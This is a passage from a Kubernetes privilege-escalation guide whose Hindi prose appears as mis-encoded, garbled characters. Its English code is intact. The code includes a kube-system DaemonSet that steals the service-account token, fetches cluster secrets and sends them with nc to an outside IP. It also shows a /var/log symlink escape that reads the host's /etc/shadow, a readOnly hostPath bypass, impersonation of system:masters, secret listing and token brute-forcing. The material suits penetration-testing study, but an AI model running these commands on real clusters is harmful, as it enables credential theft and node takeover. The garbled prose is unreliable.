рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред**

рдорд╛рди рд▓реЗрдВ рдХрд┐ рд╣рдореЗрдВ **рдПрдХ рдбреЗрдордирд╕реЗрдЯ рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ** рдФрд░ рд╣рдо рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд YAML рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рддреЗ рд╣реИрдВред рдЗрд╕ YAML рдлрд╝рд╛рдЗрд▓ рдХреЛ "рдкреЙрдб рдмрдирд╛рдПрдВ" рдЕрдиреБрднрд╛рдЧ рдореЗрдВ рд╣рдордиреЗ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рдХрджрдореЛрдВ рдХреЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
рдпрд╣рд╛рдВ рд▓рд╛рдЗрди 6 рдореЗрдВ рдЖрдк "spec" рдСрдмреНрдЬреЗрдХреНрдЯ рдФрд░ рдЗрд╕рдХреЗ рдмрдЪреНрдЪреЗ рдСрдмреНрдЬреЗрдХреНрдЯ рдЬреИрд╕реЗ "template" рдкрд╛рдПрдВрдЧреЗред рдпреЗ рдСрдмреНрдЬреЗрдХреНрдЯ рд╣рдорд╛рд░реЗ рдХрд╛рд░реНрдп рдХреЛ рдкреВрд░рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд░рдЦрддреЗ рд╣реИрдВред рдПрдХ рдФрд░ рдмрд╛рдд рдзреНрдпрд╛рди рджреЗрдиреЗ рдпреЛрдЧреНрдп рд╣реИ "serviceAccountName" рд▓рд╛рдЗрди 15 рдореЗрдВ рдФрд░ "containers" рдСрдмреНрдЬреЗрдХреНрдЯ рд▓рд╛рдЗрди 18 рдореЗрдВред рдпрд╣ рд╡рд╣ рд╣рд┐рд╕реНрд╕рд╛ рд╣реИ рдЬреЛ рд╣рдорд╛рд░реЗ рджреБрд╖реНрдЯ container рдХреЛ рдмрдирд╛рдиреЗ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╣реИред

Kubernetes API рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рдЗрдВрдбрд┐рдХреЗрдЯ рдХрд░рддрд╛ рд╣реИ рдХрд┐ "PodTemplateSpec" рдПрдВрдбрдкреЙрдЗрдВрдЯ рдореЗрдВ container рдмрдирд╛рдиреЗ рдХрд╛ рд╡рд┐рдХрд▓реНрдк рд╣реЛрддрд╛ рд╣реИред рдФрд░, рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ: deployment, daemonsets, statefulsets, replicationcontrollers, replicasets, jobs рдФрд░ cronjobs рд╕рднреА pods рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

![](https://www.cyberark.com/wp-content/uploads/2019/08/Kube-Pentest-Fig-8.png)

**рдЗрд╕рд▓рд┐рдП, рдХреНрд▓рд╕реНрдЯрд░ рдореЗрдВ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдирд╛рдиреЗ рдпрд╛ рдЕрджреНрдпрддрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рднреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред**

### **рдкреЙрдбреНрд╕ Exec**

**`pods/exec`** рдХреБрдмрд░рдиреЗрдЯреЗрд╕ рдореЗрдВ рдПрдХ рд╕рдВрд╕рд╛рдзрди рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **рдкреЙрдб рдХреЗ рдЕрдВрджрд░ рд╢реИрд▓ рдореЗрдВ рдХрдорд╛рдВрдб рдЪрд▓рд╛рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ рдХреЗ рд▓рд┐рдП рд╣реИ рдЬреЛ **рдХрдВрдЯреЗрдирд░реЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рдФрд░ рдХрдорд╛рдВрдб рдЪрд▓рд╛рдирд╛** рдЪрд╛рд╣рддреЗ рд╣реИрдВред рдпрд╣ рдХрдВрдЯреЗрдирд░ рдХреЗ рд▓рд┐рдП рдПрдХ SSH рд╕рддреНрд░ рдмрдирд╛рдиреЗ рдХреА рддрд░рд╣ рд╣реИред

рдпрджрд┐ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдпрд╣ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реИ, рддреЛ рд╣рдореЗрдВ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ **рд╕рднреА рдкреЙрдбреНрд╕ рдкрд░ рдирд┐рдпрдВрддреНрд░рдг рд▓реЗрдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдорд┐рд▓рддреА рд╣реИ**ред рдЗрд╕реЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
рдиреЛрдЯ рдХрд░реЗрдВ рдХрд┐ рдЬреИрд╕реЗ рдЖрдк рдХрд┐рд╕реА рднреА рдкреЙрдб рдореЗрдВ рдкреНрд░рд╡реЗрд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЖрдк **рдкреЙрдб рдирд┐рд░реНрдорд╛рдг рд╢реЛрд╖рдг** рдореЗрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рддрд░реАрдХрд╛ рдЕрдкрдирд╛рдХрд░ рдЕрдиреНрдп рдкреЙрдб рдХреЗ рдЯреЛрдХрди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдк рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХреЗрдВред

### рдкреЛрд░реНрдЯ-рдлрд╝реЙрд░рд╡рд░реНрдб

рдпрд╣ рдЕрдиреБрдорддрд┐ **рдПрдХ рд╕реНрдкрд╖реНрдЯ рдкреЙрдб рдореЗрдВ рдПрдХ рд╕реНрдерд╛рдиреАрдп рдкреЛрд░реНрдЯ рдХреЛ рдПрдХ рдкреЛрд░реНрдЯ рдкрд░ рдЖрдЧреЗ рднреЗрдЬрдиреЗ рдХреА** рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рдЗрд╕рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдкреЙрдб рдХреЗ рдЕрдВрджрд░ рдЪрд▓ рд░рд╣реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдбреАрдмрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИ, рд▓реЗрдХрд┐рди рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреЙрдб рдХреЗ рдЕрдВрджрд░ рджрд┐рд▓рдЪрд╕реНрдк (рдЬреИрд╕реЗ рдбреАрдмреА) рдпрд╛ рднреНрд░рд╖реНрдЯ (рд╡реЗрдм?) рдПрдкреНрд▓рд┐рдХреЗрд╢рди рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```
kubectl port-forward pod/mypod 5000:5000
```
### **рд╣реЛрд╕реНрдЯ рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп /var/log/ рд╕реЗ рдмрдЪрдирд╛**

рдЬреИрд╕рд╛ рдХрд┐ [**рдЗрд╕ рд╢реЛрдз рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), рдпрджрд┐ рдЖрдкрдХреЛ рдкрд╣реБрдВрдЪ рд╣реЛрддреА рд╣реИ рдпрд╛ рдЖрдкрдХреЛ рдПрдХ рдкреЙрдб рдореЗрдВ **рд╣реЛрд╕реНрдЯ `/var/log/` рдирд┐рд░реНрдзрд╛рд░рд┐рдд** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рдЖрдк **рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрдЪ рд╕рдХрддреЗ рд╣реИрдВ**ред
рдпрд╣ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЬрдм **Kube-API рдХрдВрдЯреЗрдирд░ рдХреА рд▓реЙрдЧреНрд╕** рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ ( `kubectl logs <рдкреЙрдб>` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ), рддреЛ рдпрд╣ **Kubelet** рд╕реЗрд╡рд╛ рдХреЗ `/logs/` рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреЙрдб рдХреЗ `0.log` рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рддрд╛ рд╣реИред
Kubelet рд╕реЗрд╡рд╛ `/logs/` рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЛ рдЙрджрд╛рд╣рд░рдгрд╛рд░реНрде **рдХрдВрдЯреЗрдирд░ рдХреЗ `/var/log` рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдЙрджрд╛рд╣рд░рдгрд╛рд░реНрде** рдкреНрд░рдХрдЯ рдХрд░рддреА рд╣реИред

рдЗрд╕рд▓рд┐рдП, рдХрдВрдЯреЗрдирд░ рдХреЗ **/var/log/ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдкрд╣реБрдВрдЪ рд╡рд╛рд▓реЗ рдПрдХ рд╣рдорд▓рд╛рд╡рд░** рдЗрд╕ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ 2 рддрд░реАрдХреЛрдВ рд╕реЗ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:

* рдЕрдкрдиреЗ рдХрдВрдЯреЗрдирд░ рдХреА `0.log` рдлрд╝рд╛рдЗрд▓ (рдЖрдорддреМрд░ рдкрд░ `/var/logs/pods/namespace_pod_uid/container/0.log` рдореЗрдВ рд╕реНрдерд┐рдд) рдХреЛ **`/etc/shadow` рдХреА рдУрд░ рд╕рдВрдХреЗрдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╕рд┐рдВрдмрд▓рд┐рдВрдХ** рдмрдирд╛рдирд╛ред рдлрд┐рд░, рдЖрдк рдЗрд╕реЗ рдХрд░рдХреЗ рд╣реЛрд╕реНрдЯ рд╢реИрдбреЛ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдирд┐рдХрд╛рд▓ рд╕рдХреЗрдВрдЧреЗ:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* рдпрджрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХрд┐рд╕реА рдкреНрд░рдореБрдЦ рдХреЛрдВрдЯреНрд░реЛрд▓ рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ **`nodes/log` рдХреЛ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИ**, рддреЛ рд╡рд╣ рд╕реАрдзреЗ `/host-mounted/var/log/sym` рдореЗрдВ `/` рдХреЗ рд▓рд┐рдП рдПрдХ **рд╕рд┐рдВрдмрд▓рд┐рдВрдХ** рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЬрдм рд╡рд╣ **`https://<gateway>:10250/logs/sym/` рддрдХ рдкрд╣реБрдВрдЪрддрд╛ рд╣реИ рддреЛ рд╡рд╣ рдореЗрдЬрдмрд╛рди рдХреА рд░реВрдЯ** рдлрд╝рд╛рдЗрд▓рд╕рд┐рд╕реНрдЯрдо рдХреЛ рд╕реВрдЪреАрдмрджреНрдз рдХрд░реЗрдЧрд╛ (рд╕рд┐рдВрдмрд▓рд┐рдВрдХ рдмрджрд▓рдиреЗ рд╕реЗ рдлрд╝рд╛рдЗрд▓реЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рджрд╛рди рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ)ред
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**рдПрдХ рдкреНрд░рдпреЛрдЧрд╢рд╛рд▓рд╛ рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд╢реЛрдз рдпрд╣рд╛рдВ рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИ** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### readOnly рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдЫреЛрдбрд╝рдирд╛ <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

рдпрджрд┐ рдЖрдкрдХреЛ рднрд╛рдЧреНрдпрд╢рд╛рд▓реА рд╣реЛрдиреЗ рдХрд╛ рд╕реМрднрд╛рдЧреНрдп рд╣реЛ рдФрд░ рдЙрдЪреНрдЪ рдкреНрд░рднрд╛рд╡реА рдХреНрд╖рдорддрд╛ `CAP_SYS_ADMIN` рдЙрдкрд▓рдмреНрдз рд╣реЛ, рддреЛ рдЖрдк рд╕реАрдзреЗ рдлрд╝реЛрд▓реНрдбрд░ рдХреЛ rw рдХреЗ рд░реВрдк рдореЗрдВ рд░реАрдорд╛рдЙрдВрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
mount -o rw,remount /hostlogs/
```
#### рд╣реЛрд╕реНрдЯрдкреИрде рдХреЗ readOnly рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░рдирд╛ <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

[**рдЗрд╕ рд░рд┐рд╕рд░реНрдЪ**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html) рдореЗрдВ рдХрд╣рд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
рдпрд╣ рдкрд┐рдЫрд▓реЗ рддрд░реАрдХреЛрдВ рдХреА рддрд░рд╣ рдмрдЪрд╛рд╡ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдерд╛, рдЬрд╣рд╛рдВ рд╣реЛрд╕реНрдЯрдкрде рдорд╛рдЙрдВрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рдХреЗ рдмрдЬрд╛рдп рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдПрдХ рд╣реЛрд╕реНрдЯ рдлрд╝реЛрд▓реНрдбрд░ рдХреЛ рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдкрд╣реБрдБрдЪ рдХреЗ рд╕рд╛рде рдорд╛рдЙрдВрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП PersistentVolume рдФрд░ PersistentVolumeClaim рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдЦрд╛рддреЛрдВ рдХреА рдЕрдиреБрдХрд░рдг рдХрд░рдирд╛**

[**рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдиреБрдХрд░рдг**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation) рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХреЗ рд╕рд╛рде, рдПрдХ рд╣рдорд▓рд╛рд╡рд░реНрддреА рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдЦрд╛рддреЗ рдХреА рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ _**sa-imper**_ рдХреЛ рдПрдХ ClusterRole рдХреЗ рд╕рд╛рде рдмрд╛рдЗрдВрдб рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдирд┐рдпрдо рд╣реИрдВ рдЬреЛ рдЗрд╕реЗ рд╕рдореВрд╣реЛрдВ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRole\_for\_user\_impersonation.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRole\_for\_user\_impersonation\_2.png)

`--as=null --as-group=system:master` рдЧреБрдгреЛрдВ рдХреЗ рд╕рд╛рде рд╕рднреА рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЛ **рд╕реВрдЪреАрдмрджреНрдз рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ**:

![](https://www.cyberark.com/wp-content/uploads/2018/12/listing\_secrets\_with\_and\_without\_user\_impersonation-1024x108.png)

**рдПрдкреАрдЖрдИ рдЖрд░рд╛рдореНрднрд┐рдХ рдЕрдВрддрдмрд┐рдВрджреБ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреА рдпрд╣реА рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ:**
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### **рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреА рд╕реВрдЪреА рдмрдирд╛рдирд╛**

**рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреА рд╕реВрдЪреА рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рдХреНрд▓рд╕реНрдЯрд░ рдореЗрдВ рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдордЬрдмреВрдд рдХреНрд╖рдорддрд╛ рд╣реИред рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреА рд╕реВрдЪреА рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ **рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдХреНрд▓рд╕реНрдЯрд░ рдореЗрдВ рд╕рднреА рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЛ рджреЗрдЦрдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрддреА рд╣реИ - рдЗрд╕рдореЗрдВ рдПрдбрдорд┐рди рдХреБрдВрдЬреА рднреА рд╢рд╛рдорд┐рд▓ рд╣реЛ рд╕рдХрддреА рд╣реИ**ред рд╕реАрдХреНрд░реЗрдЯ рдХреБрдВрдЬреА рдПрдХ рдмреЗрд╕64 рдореЗрдВ рдПрдирдХреЛрдб рдХрд┐рдП рдЧрдП JWT рдЯреЛрдХрди рд╣реЛрддреА рд╣реИред

![](https://www.cyberark.com/wp-content/uploads/2018/12/listing\_secrets\_role.png)

рдХреНрд▓рд╕реНрдЯрд░ рдореЗрдВ **\_рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреА рд╕реВрдЪреА рдмрдирд╛рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдХреЛ рдПрдХреНрд╕реЗрд╕ рдорд┐рд▓рддрд╛ рд╣реИ\_** рддреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ "kube-system" рдиреЗрдорд╕реНрдкреЗрд╕ рдореЗрдВ рд╕рднреА рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд _рдХрд░реНрд▓_ рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
![](https://www.cyberark.com/wp-content/uploads/2019/08/Kube-Pentest-Fig-2.png)

### **рдПрдХ рд╕реАрдХреНрд░реЗрдЯ рдкрдврд╝рдирд╛ - рдЯреЛрдХрди рдЖрдИрдбреА рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдирд╛**

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдиреЗ рдПрдХ рд╕реАрдХреНрд░реЗрдЯ рдХреЛ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╡рд╛рд▓рд╛ рдЯреЛрдХрди рдвреВрдВрдврд╝ рд▓рд┐рдпрд╛ рд╣реИ, рдЙрд╕реЗ рд╕реАрдХреНрд░реЗрдЯ рдХреЛ рдкреВрд░реНрдг рдирд╛рдо рдЬрд╛рдиреЗ рдмрд┐рдирд╛ рдЗрд╕ рдЕрдиреБрдорддрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдЕрдиреБрдорддрд┐ рдКрдкрд░ рд╡рд░реНрдгрд┐рдд _**рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреА рд╕реВрдЪреА**_ рдЕрдиреБрдорддрд┐ рд╕реЗ рдЕрд▓рдЧ рд╣реЛрддреА рд╣реИред

![](https://www.cyberark.com/wp-content/uploads/2018/12/getting\_secret\_clusterRole.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRoleBinding\_with\_get\_secrets\_clusterRole.png)

рд╣рд╛рд▓рд╛рдВрдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рд╕реАрдХреНрд░реЗрдЯ рдХрд╛ рдирд╛рдо рдирд╣реАрдВ рдкрддрд╛ рд╣реИ, рдЗрд╕рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕рд░реНрд╡рд┐рд╕ рдЕрдХрд╛рдЙрдВрдЯреНрд╕ рд╣реЛрддреЗ рд╣реИрдВред

![](https://www.cyberark.com/wp-content/uploads/2018/12/default\_service\_accounts\_list.png)

рдкреНрд░рддреНрдпреЗрдХ рд╕рд░реНрд╡рд┐рд╕ рдЕрдХрд╛рдЙрдВрдЯ рдХреЗ рд╕рд╛рде рдПрдХ рд╕рдВрдмрдВрдзрд┐рдд рд╕реАрдХреНрд░реЗрдЯ рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рд╕реНрдерд┐рд░ (рдмрджрд▓рдиреЗ рд╡рд╛рд▓рд╛ рдирд╣реАрдВ) рдкреНрд░реАрдлрд╝рд┐рдХреНрд╕ рдФрд░ рдПрдХ рдкрд╛рдВрдЪ-рд╡рд░реНрдгрд╛рддреНрдордХ рддрд╛рд░ рдЯреЛрдХрди рдХрд╛ рдкреЛрд╕реНрдЯрдлрд╝рд┐рдХреНрд╕ рд╣реЛрддрд╛ рд╣реИред

![](https://www.cyberark.com/wp-content/uploads/2018/12/default\_service\_account\_on\_kube\_system\_namespace-1024x556.png)

рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдЯреЛрдХрди рд╕рдВрд░рдЪрдирд╛ рдкрд╛рдВрдЪ-рд╡рд░реНрдгрд╛рддреНрдордХ рддрд╛рд░ рд╕реЗ рдмрдиреА рд╣реЛрддреА рд╣реИ рдЬреЛ рдЕрдХреНрд╖рд░рдорд╛рд▓рд╛ (рдирд┐рдЪрд▓реЗ рдЕрдХреНрд╖рд░ рдФрд░ рдЕрдВрдХ) рд╡рд╛рд▓реЗ рдЕрдХреНрд╖рд░реЛрдВ рд╕реЗ рдмрдиреА рд╣реЛрддреА рд╣реИред **рд▓реЗрдХрд┐рди рдЗрд╕рдореЗрдВ рд╕рднреА рдЕрдХреНрд╖рд░ рдФрд░ рдЕрдВрдХ рд╢рд╛рдорд┐рд▓ рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВред**

рд╕реНрд░реЛрдд рдХреЛрдб рдХреА рджреЗрдЦреЗрдВ [рдпрд╣рд╛рдВ](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83), рдЗрд╕рд╕реЗ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ рдЯреЛрдХрди рдХреЗрд╡рд▓ 27 рдЕрдХреНрд╖рд░реЛрдВ "bcdfghjklmnpqrstvwxz2456789" рд╕реЗ рдЙрддреНрдкрдиреНрди рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдирд╣реАрдВ 36 (a-z рдФрд░ 0-9)

![](https://www.cyberark.com/wp-content/uploads/2018/12/character\_set\_from\_rand\_go.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/comments\_on\_removing\_characters\_rand\_go\_character\_set-1024x138.png)

